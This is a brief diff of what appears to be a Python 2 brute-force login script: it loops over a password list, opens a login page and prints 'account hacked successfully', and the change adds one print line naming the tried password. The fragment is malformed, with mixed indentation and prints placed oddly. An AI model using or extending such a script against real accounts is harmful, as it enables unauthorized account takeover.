@@ -96,6 +96,7 @@ for pwd in password :
     def main():
           print 'Time elapsed: ' + str(time.time() - start_time)
           print 'account hacked successfully'
+	  print 'check the password before {}'.format(pwd)
     for i in tqdm(range(len(password))):
         try:
     	  site = br.open(login)
